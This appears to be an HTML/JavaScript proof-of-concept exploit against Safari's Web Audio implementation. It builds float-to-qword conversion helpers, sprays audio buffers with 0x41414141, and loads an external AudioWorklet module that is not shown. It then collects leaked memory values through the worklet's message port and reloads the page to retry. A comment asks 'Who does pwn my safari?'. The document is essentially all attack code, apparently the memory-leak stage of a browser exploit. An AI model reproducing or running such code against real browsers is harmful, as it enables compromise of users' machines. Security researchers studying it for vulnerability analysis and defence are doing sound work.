<body></body>
<pre id='log' style="font-size : 40px;"></pre>

</script>
<script>
        function print(str) {
            var log = document.getElementById('log');
            console.log(str);
            if (log) {
                log.innerText += "[+] "+str + '\n';
            }
        }
        let data_view = new DataView(new ArrayBuffer(8));
        floatAsQword = float => {
            data_view.setFloat64(0, float, true);
            var low = data_view.getUint32(0, true);
            var high = data_view.getUint32(4, true);
            return low + high * 0x100000000;
        }

        qwordAsFloat = qword => {
            data_view.setUint32(0, qword%0x100000000, true);
            data_view.setUint32(4, qword/0x100000000, true);
            //data_view.setBigUint64(0, qword);
            return data_view.getFloat64(0);
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        async function main(){
            //print("Who does pwn my safari?");
            let audioCtx = new OfflineAudioContext({numberOfChannels: 1, length: 0x100000, sampleRate: 44100});
            
            let outputBufferSrc = new ConvolverNode(audioCtx);
            let inputBufferSrc = new AudioBufferSourceNode(audioCtx);
            let outputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            let inputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            
            outputBufferSrc.buffer = outputBuffer;
            inputBufferSrc.loop = true;
            inputBufferSrc.buffer = inputBuffer;
            let outputBufferU32 = new Uint32Array(outputBuffer.getChannelData(0).buffer);
            let inputBufferU32 = new Uint32Array(inputBuffer.getChannelData(0).buffer);
            
            inputBufferU32.fill(0x41414141);
            
            //console.log("1234")
            await audioCtx.audioWorklet.addModule("fuck.js");
            //alert();
            //await sleep(1000);
            let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
            let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
            //return 0;
            let source = new AudioBufferSourceNode(audioCtx);
            let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            await sleep(500);
            //alert();
            let is_leak = true;
            originNode2.port.onmessage = async (e)=>{
                if(e.data == "retry"){
                    //print(e.data);
                    //await sleep(2000);
                    location.reload();
                    return;
                }
                if(!is_leak){
                    //console.log(e.data.toString(16));
                    print(e.data);
                    return;
                }
                
                var leak = e.data;
                
                for(var i = 0; i < leak.length; i ++){
                    if(leak[i] != 0)
                        (`[${i}] : ` + floatAsQword(leak[i]).toString(16));
                }
                is_leak = false;
                //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
                //console.log("suspend");
            }
            //
            originNode.connect(audioCtx.destination);
            /*
            inputBufferSrc.connect(originNode)
            .connect(outputBufferSrc)
            .connect(audioCtx.destination);
            */
            //originNode2.connect(audioCtx.destination);
            await audioCtx.startRendering();
            
            //alert("fuck");
            
        }
        //alert();
        //alert(window.OfflineAudioContext);
        main();
</script>